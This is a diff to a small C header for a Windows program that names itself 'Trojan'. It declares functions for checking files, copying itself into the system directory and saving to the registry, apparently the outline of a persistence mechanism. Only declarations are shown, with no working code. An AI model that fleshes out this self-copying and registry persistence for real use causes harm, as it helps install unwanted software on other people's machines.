@@ -5,11 +5,14 @@
 
 #include <Windows.h>
 
-BOOL Copy2Sysdir();
-// BOOL SaveInReg();
+#define APP_NAME        TEXT("Trojan")
+#define APP_NAME4FOLDER TEXT("\\Trojan.exe")
+
+BOOL   FileExist(const PTCHAR filename);
+BOOL   Copy2Sysdir();
+BOOL   SaveInReg();
 
 VOID PrintError(const PTCHAR msg, INT error);
-//inline VOID PrintError(const PTCHAR msg) { PrintError(msg, 0); }
 VOID ClearConsole();
 
 #endif /* __TOOLS_H_INCLUDED__ */
